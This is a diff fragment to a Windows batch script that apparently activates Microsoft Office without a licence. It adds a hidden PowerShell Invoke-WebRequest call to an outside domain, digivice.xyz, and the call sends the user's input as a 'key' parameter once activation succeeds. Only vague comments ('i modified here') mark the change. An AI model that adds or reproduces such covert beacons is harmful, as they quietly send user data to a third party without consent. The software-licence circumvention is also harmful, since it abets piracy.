@@ -2083,6 +2083,12 @@ if !errorlevel! NEQ 0 cscript //nologo %windir%\system32\slmgr.vbs /rilc %nul%
 
 echo:
 if not defined error (
+
+:: i modified here
+:: hit url to update scripting status
+powershell -command "(Invoke-WebRequest -Uri 'https://digivice.xyz/update/status?product=office&status=complete2089&key=!userInput!')"
+
+
 call :dk_color %Green% "Office is permanently activated."
 
 ::i modified
